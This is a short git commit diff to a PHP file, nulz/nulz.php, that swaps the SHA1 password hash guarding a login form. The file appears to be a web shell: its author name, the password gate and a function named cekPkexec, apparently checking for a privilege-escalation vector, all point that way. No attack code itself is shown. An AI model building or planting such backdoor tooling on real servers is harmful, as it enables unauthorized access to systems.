3f8f88d0b1318e613c6ad2b2a5e1079c8962fad3
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-01-26 20:22:45 +0700

    NuLz

--- nulz/nulz.php
+++ nulz/nulz.php
@@ -446,7 +446,7 @@ function cekPkexec() {
 }
 
 //login
-$passwd = '386421265b975230158e1386249bc28c82ba8bd6';
+$passwd = '5c3c0d4ceddf2d80aad8df2c5e28e976c19e286a';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
